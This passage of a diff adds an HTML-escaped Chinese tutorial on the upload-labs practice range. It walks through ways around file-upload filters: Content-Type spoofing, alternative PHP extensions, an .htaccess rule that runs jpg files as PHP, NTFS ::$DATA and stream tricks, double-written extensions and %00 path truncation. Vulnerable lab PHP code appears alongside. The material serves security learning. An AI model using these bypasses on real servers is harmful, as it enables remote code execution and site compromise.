class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;image/png&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;image/gif&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="使用burp绕过"&gt;使用burp绕过
+&lt;/h3&gt;&lt;p&gt;Pass-02&lt;/p&gt;
+&lt;p&gt;为了方便观察，我们打开upload lab 的 上传存储文件夹 &lt;code&gt;C:\phpstudy_pro\WWW\upload&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;常见的媒体格式类型如下：
+更多参考 runoob &lt;a class="link" href="https://www.runoob.com/http/http-content-type.html" target="_blank" rel="noopener"
+&gt;HTTP content-type | 菜鸟教程 (runoob.com)&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; - text/html ： HTML格式
+- text/plain ：纯文本格式
+- text/xml ： XML格式
+- image/gif ：gif图片格式
+- image/jpeg ：jpg图片格式
+- image/png：png图片格式
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;上传1.php文件&lt;/li&gt;
+&lt;li&gt;开启抓包，修改文件的 content-type 字段为 image/jpeg&lt;/li&gt;
+&lt;li&gt;放行包
+&lt;img src="https://i.imgur.com/w1QMd8h.png"
+loading="lazy"
+alt="Imgur"
+&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id="05-绕过简单黑名单"&gt;05-绕过简单黑名单
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：黑名单，后缀限制较少&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;如果出现这种提示：不允许上传.asp,.aspx,.php,.jsp后缀文件，则可以判断是黑名单上传。&lt;/p&gt;
+&lt;p&gt;对于iis：
+可以上传 asa \ cer \ cdx 这些&lt;/p&gt;
+&lt;p&gt;对于apache:
+可以上传 phtml \ php3 这些&lt;/p&gt;
+&lt;p&gt;Pass03&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$is_upload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;file_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$deny_ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.asp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.aspx&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.jsp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;//这里开始下面一大块就是获取后缀名然后tolower
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;deldot&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file_name&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//删除文件名末尾的点
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;strrchr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;//转换为小写
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;str_ireplace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;::$DATA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="c1"&gt;//去除字符串::$DATA
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$file_ext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;//收尾去空
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;in_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$deny_ext&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$temp_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$img_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;UPLOAD_PATH&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;move_uploaded_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$temp_file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$img_path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$is_upload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;上传出错！&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;UPLOAD_PATH&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;文件夹不存在,请手工创建！&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="06-htaccess文件重写攻击"&gt;06-.htaccess文件重写攻击
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：黑名单没有限制 .htaccess， Apache专用&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;上传 1.jpg 文件&lt;/li&gt;
+&lt;li&gt;上传 .htaccess 文件&lt;/li&gt;
+&lt;li&gt;访问 jpg 上传后的位置，发现已经执行了里面的php代码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;.htaccess 是一个apache的配置文件，可以修改apache服务器处理文件的行为&lt;/p&gt;
+&lt;p&gt;比如我们制作一个攻击用 .htaccess 文件内容如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class="err"&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;SetHandler application/x-httpd-php
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样你访问jpg文件目录的时候，他就会把你上传 的 jpg 当作 php 来执行了。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="07-大小写绕过"&gt;07-大小写绕过
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：黑名单，php早期版本，5.x&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;有的上传使用黑名单，且未对大小写进行严格判断：&lt;/p&gt;
+&lt;p&gt;这时候可尝试上传 &lt;code&gt;xxx .phP&lt;/code&gt; , 但是貌似对于新的php版本无效。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="08-空格绕过windows服务器点绕过"&gt;08-空格绕过、windows服务器点绕过
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：黑名单，php5.x，后端未对空格过滤 ，服务器采用windows系统&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id="空格绕过"&gt;空格绕过
+&lt;/h3&gt;&lt;p&gt;Pass-06
+Pass-07&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;上传1.php&lt;/li&gt;
+&lt;li&gt;抓包，改写文件名为 &lt;code&gt;1.php&amp;lt;空格&amp;gt; &lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;放行，上传成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;发现一个问题，就是我一开始用了 小皮面板，php版本：7.3.4 ，无法成功。&lt;/p&gt;
+&lt;p&gt;但是后面用了按月给的那个环境，php：5.2.17 可复现。&lt;/p&gt;
+&lt;p&gt;所以版本比较高的没用。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id="windows服务器点绕过"&gt;windows服务器点绕过
+&lt;/h3&gt;&lt;p&gt;如果对方的后端使用的是Windows， Windows系统会在把文件复制到上传文件夹的时候自动删除文件末尾的点 ， 比如你传 &lt;code&gt;1.php.&lt;/code&gt; 通过了验证 ,然后Windows把它给挪到上传文件夹后就自动变成 &lt;code&gt;1.php&lt;/code&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;上传 &lt;code&gt;1.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;抓包，改写文件名为 &lt;code&gt;1.php. &lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;放行，上传成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id="09-ntfs数据流绕过-data"&gt;09-NTFS数据流绕过 DATA
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：windows NTFS ，黑名单，对::$DATA 字符串未做限制&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;我是win系统，但是硬盘使用了extFAT格式，所以一直不成功。
+然后我重启这个phpstudy环境，把整个WWW文件位置挪到了NTFS格式硬盘的桌面上，
+还是不行，最后发现要在phpStudy设置中-设置新的网站目录
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Pass-08&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法：&lt;/strong&gt;
+抓包，文件名+&amp;quot;::$DATA&amp;quot; 上传，可用绕过后缀检测&lt;/p&gt;
+&lt;h3 id="数据流知识"&gt;数据流知识
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;下面是经过我修改得的GPT回复，可用用来浅浅的了解下NTFS数据流。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;NTFS数据流是指在NTFS文件系统中，一个文件可以包含多个数据流（Alternate Data Streams，ADS）。每个数据流可以存储额外的数据，与文件的主数据流相互独立，但在一般情况下是不可见的。&lt;/p&gt;
+&lt;p&gt;对于普通用户而言，操作NTFS数据流可能需要一些高级的技术和工具。然而，以下是一种简单的方法来操作NTFS数据流：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;创建一个新的文本文件，例如&amp;quot;test.txt&amp;quot;。&lt;/li&gt;
+&lt;li&gt;打开命令提示符（CMD）。&lt;/li&gt;
+&lt;li&gt;使用以下命令创建一个新的数据流并写入数据：&lt;br&gt;
+      &lt;code&gt;echo This is a hidden message &amp;gt; test.txt:hidden.txt&lt;/code&gt;&lt;br&gt;
+   这个命令将在&amp;quot;test.txt&amp;quot;文件中创建一个名为&amp;quot;hidden.txt&amp;quot;的数据流，并将&amp;quot;This is a hidden message&amp;quot;写入该数据流。&lt;/li&gt;
+&lt;li&gt;使用以下命令查看文件中的所有数据流：&lt;br&gt;
+      &lt;code&gt;dir /r test.txt&lt;/code&gt;&lt;br&gt;
+   这个命令将显示&amp;quot;test.txt&amp;quot;文件以及它的所有数据流。&lt;/li&gt;
+&lt;li&gt;使用以下命令读取数据流的内容：&lt;br&gt;
+      &lt;code&gt;more &amp;lt; test.txt:hidden.txt&lt;/code&gt;&lt;br&gt;
+   这个命令将显示&amp;quot;hidden.txt&amp;quot;数据流中的内容。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;请注意，以上方法仅适用于在Windows命令提示符下进行简单的操作。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;我理解，数据流就是NTFS系统中的一种隐藏文件，这玩意可有一个宿主文件。宿主文件删了，数据流就跟着没了。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="10-windows-叠加特征上传"&gt;10-windows 叠加特征上传
+&lt;/h2&gt;&lt;p&gt;Pass-09&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;适用范围：windows NTFS ，黑名单，对 尖括号没有限制的情况&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;上传 &lt;code&gt;s.jpg&lt;/code&gt; 文件，文件名用 burp 修改：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;s.php:s.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;这时候系统就会通过校验，因为后缀名是jpg，但是因为文件流，实际上 s.jpg 将会不可见。并且会新建一个 s.php 文件（空文件）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol start="2"&gt;
+&lt;li&gt;
+&lt;p&gt;上传 1.php 文件，抓包修改名称 为 &lt;code&gt;s.&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt; 代表 &lt;code&gt;s.???&lt;/code&gt; ，会正则匹配到刚才创建的 s.php 。 然后系统会把他的内容变成你新上传的内容。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;打开 ： http://localhost/upload/s.php 即可发现上传成功&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;文件名匹配规则：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 双引号&amp;#34; 等于 点号.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 大于符号&amp;gt; 等于 问号?
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 小于符号&amp;lt; 等于 星号*
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="11-双写文件名"&gt;11-双写文件名
+&lt;/h2&gt;&lt;p&gt;Pass-10&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;适用范围：黑名单，上传后端使用关键字删除
+如上传 &lt;code&gt;1.php&lt;/code&gt; ， 实际会上传文件 &lt;code&gt;1.&lt;/code&gt; 到目录的情况&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;抓包修改文件名称为 &lt;code&gt;1.pphphp&lt;/code&gt; （在php外面夹着一个p hp，其他类型文件同理，只要过滤器做的比较垃圾就会成功绕过）&lt;/li&gt;
+&lt;li&gt;查看发现上传成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id="12-上传参数目录可控"&gt;12-上传参数目录可控
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：php&amp;lt;5.3.4 ， 未开启gpc , 使用%00&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id="get-方式"&gt;Get 方式
+&lt;/h3&gt;&lt;p&gt;Pass-11&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;客户端可以控制上传路径，如 url中有如下类似字串 &lt;code&gt;?save_path=../upload/&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;$img_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;save_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;正常上传会产生 一个上传目录：&lt;code&gt;../upload/039840198431.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;上传jpg文件&lt;/li&gt;
+&lt;li&gt;抓包修改请求头为 &lt;code&gt;?save_path=../upload/1.php%00&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;这样上传路径变成 &lt;code&gt;../upload/1.php%00039840198431.jpg&lt;/code&gt; ， 然后php 保存的时候把 %00 后面的东西都忽略了，就把文件保存成 1.php 了&lt;/li&gt;
+&lt;li&gt;访问 http://localhost/upload/1.php 成功&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="post-方式"&gt;Post 方式
+&lt;/h3&gt;&lt;p&gt;Pass-12&lt;/p&gt;
+&lt;p&gt;php后端源码改用了 post 方式获取 savepath，这时候同样可以使用 %00 但是要进行url解码。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$img_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;save_path&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$file_ext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
+&lt;li&gt;上传jpg文件&lt;/li&gt;
+&lt;li&gt;抓包修改post 内容&lt;/li&gt;
+&lt;/ol&gt;
